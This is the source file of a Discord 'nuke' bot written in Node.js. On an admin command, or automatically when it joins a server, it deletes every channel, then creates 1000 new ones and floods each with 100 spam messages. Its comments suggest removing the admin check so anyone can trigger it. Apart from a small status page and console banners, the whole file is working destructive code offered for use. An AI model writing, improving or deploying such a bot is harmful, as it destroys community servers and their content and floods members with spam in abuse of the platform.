// index.js - ULTRA FAST DISCORD NUKE BOT - NO CONFIRMATION NEEDED
require('dotenv').config();
const { Client, GatewayIntentBits, ActivityType, PermissionsBitField } = require('discord.js');
const express = require('express');
const chalk = require('chalk');
const config = require('./config.js');

// Express server for Render
const app = express();
const PORT = process.env.PORT || config.port;

app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>ULTRA FAST NUKE BOT</title>
                <style>
                    body { 
                        background: linear-gradient(45deg, #000000, #ff0000);
                        color: white;
                        font-family: Arial;
                        text-align: center;
                        padding: 50px;
                    }
                    h1 { font-size: 50px; text-shadow: 0 0 10px red; }
                    .status { 
                        background: rgba(0,0,0,0.7);
                        padding: 20px;
                        border-radius: 10px;
                        border: 2px solid red;
                    }
                    .counter { font-size: 40px; color: #ff0000; font-weight: bold; }
                </style>
            </head>
            <body>
                <h1>💀 ULTRA FAST NUKE BOT 💀</h1>
                <div class="status">
                    <h2>✅ BOT OPERATIONAL</h2>
                    <p>🔥 1000 CHANNELS MODE</p>
                    <p>⚡ NO CONFIRMATION NEEDED</p>
                    <p>💀 Type !nuke to DESTROY</p>
                </div>
            </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(chalk.green(`[SERVER] Health check on port ${PORT}`));
});

// Initialize Discord Client
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// Console Colors
const colors = {
    red: chalk.red.bold,
    green: chalk.green.bold,
    yellow: chalk.yellow.bold,
    blue: chalk.blue.bold,
    magenta: chalk.magenta.bold,
    cyan: chalk.cyan.bold
};

// Bot Ready Event
client.once('ready', () => {
    console.clear();
    console.log(colors.red('══════════════════════════════════════════════'));
    console.log(colors.red('██╗   ██╗██╗  ████████╗██████╗  █████╗ '));
    console.log(colors.red('██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗'));
    console.log(colors.red('██║   ██║██║     ██║   ██████╔╝███████║'));
    console.log(colors.red('██║   ██║██║     ██║   ██╔══██╗██╔══██║'));
    console.log(colors.red('╚██████╔╝██║     ██║   ██║  ██║██║  ██║'));
    console.log(colors.red(' ╚═════╝ ╚═╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝'));
    console.log(colors.red('══════════════════════════════════════════════'));
    console.log(colors.green(`✅ BOT: ${client.user.tag}`));
    console.log(colors.yellow(`📊 SERVERS: ${client.guilds.cache.size}`));
    console.log(colors.red(`💀 MODE: ULTRA FAST - 1000 CHANNELS`));
    console.log(colors.cyan(`⚡ COMMAND: !nuke (NO CONFIRMATION NEEDED)`));
    console.log(colors.red('══════════════════════════════════════════════'));

    // Status rotation
    let statusIndex = 0;
    setInterval(() => {
        const status = config.statusMessages[statusIndex % config.statusMessages.length];
        client.user.setPresence({
            activities: [{ name: status, type: ActivityType.Playing }],
            status: 'dnd'
        });
        statusIndex++;
    }, 5000);
});

// Auto-Nuke on Server Join
client.on('guildCreate', async (guild) => {
    if (!config.autoNukeOnJoin) return;
    console.log(colors.red(`[AUTO] NUKE TRIGGERED: ${guild.name}`));
    await delay(1000);
    await executeNuke(guild);
});

// Message Command Handler - ULTRA FAST, NO CONFIRMATION
client.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith(config.prefix)) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // NUKE COMMAND - NO CONFIRMATION, JUST DESTROY
    if (command === 'nuke') {
        console.log(colors.red(`[NUKE] Triggered by ${message.author.tag}`));
        
        // Check admin (optional - remove if you want anyone to nuke)
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            await message.reply('❌ Admin only');
            return;
        }

        // Send instant start message
        await message.channel.send('💀 **NUKE STARTED - 1000 CHANNELS INCOMING** 💀');
        
        // EXECUTE NUKE IMMEDIATELY - NO CONFIRMATION
        await executeNuke(message.guild);
        
        return;
    }

    // HELP COMMAND
    if (command === 'help') {
        const helpEmbed = {
            color: 0xff0000,
            title: '💀 ULTRA FAST NUKE BOT',
            description: '**1000 CHANNEL DESTRUCTION**',
            fields: [
                {
                    name: '!nuke',
                    value: '💥 Instantly deletes ALL channels and creates 1000 IMPOSTER-network channels with 100 messages each',
                }
            ],
            footer: { text: 'By Rick Ser | 100k Messages Total' }
        };
        await message.channel.send({ embeds: [helpEmbed] });
    }
});

// MAIN NUKE FUNCTION - 1000 CHANNELS + MASS SPAM
async function executeNuke(guild) {
    console.log(colors.red(`[NUKE] MASSIVE DESTRUCTION: ${guild.name}`));
    
    try {
        // PHASE 1: DELETE EVERYTHING - FAST
        console.log(colors.yellow(`[PHASE 1] Deleting all channels...`));
        const channels = await guild.channels.fetch();
        const channelList = Array.from(channels.values());
        
        let deleted = 0;
        for (const channel of channelList) {
            try {
                await channel.delete();
                deleted++;
                if (deleted % 10 === 0) console.log(colors.red(`[DELETE] ${deleted}/${channelList.length}`));
                await delay(config.delays.delete);
            } catch (e) {
                // Skip errors
            }
        }
        console.log(colors.green(`[PHASE 1] Deleted ${deleted} channels`));
        
        // PHASE 2: CREATE 1000 CHANNELS - ULTRA FAST
        console.log(colors.yellow(`[PHASE 2] Creating ${config.channelsToCreate} channels...`));
        
        const createdChannels = [];
        for (let i = 1; i <= config.channelsToCreate; i++) {
            try {
                const channelName = `${config.channelName}-${i}`;
                const newChannel = await guild.channels.create({
                    name: channelName,
                    type: 0
                });
                createdChannels.push(newChannel);
                
                // Show progress every 100 channels
                if (i % 100 === 0) console.log(colors.green(`[CREATE] ${i}/1000 channels`));
                
                await delay(config.delays.create);
            } catch (e) {
                console.log(colors.red(`[ERROR] Channel ${i} failed`));
            }
        }
        console.log(colors.green(`[PHASE 2] Created ${createdChannels.length} channels`));
        
        // PHASE 3: MASS SPAM - 100 MESSAGES PER CHANNEL = 100,000 TOTAL
        console.log(colors.yellow(`[PHASE 3] Starting MASSIVE spam (${config.messagesPerChannel * createdChannels.length} messages)...`));
        
        let totalMessages = 0;
        const spamTarget = config.messagesPerChannel * createdChannels.length;
        
        for (const channel of createdChannels) {
            try {
                // Spam loop
                for (let m = 1; m <= config.messagesPerChannel; m++) {
                    await channel.send(config.spamMessage);
                    totalMessages++;
                    
                    // Show progress every 1000 messages
                    if (totalMessages % 1000 === 0) {
                        console.log(colors.cyan(`[SPAM] ${totalMessages}/${spamTarget} messages`));
                    }
                    
                    await delay(config.delays.spam);
                }
                
                // Send embed in each channel
                const embed = {
                    color: 0xff0000,
                    title: '💀 1000 CHANNELS COMPLETE',
                    description: `**${guild.name}** has been destroyed`,
                    fields: [
                        { name: 'Channels Created', value: `1000`, inline: true },
                        { name: 'Messages Sent', value: `${totalMessages}+`, inline: true },
                        { name: 'By', value: 'Rick Ser', inline: true }
                    ]
                };
                await channel.send({ embeds: [embed] });
                
            } catch (e) {
                // Skip errors
            }
        }
        
        // FINAL REPORT
        console.log(colors.red('══════════════════════════════════'));
        console.log(colors.red(`💀 MASSIVE NUKE COMPLETE`));
        console.log(colors.yellow(`📊 Deleted: ${deleted} channels`));
        console.log(colors.yellow(`📊 Created: ${createdChannels.length} channels`));
        console.log(colors.yellow(`📊 Messages: ${totalMessages}`));
        console.log(colors.red(`🔥 By: Rick Ser`));
        console.log(colors.red('══════════════════════════════════'));
        
    } catch (error) {
        console.log(colors.red(`[FATAL] ${error.message}`));
    }
}

// Utility function
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Error handling
client.on('error', console.error);
process.on('unhandledRejection', console.error);

// Login
client.login(config.token).catch(console.error);
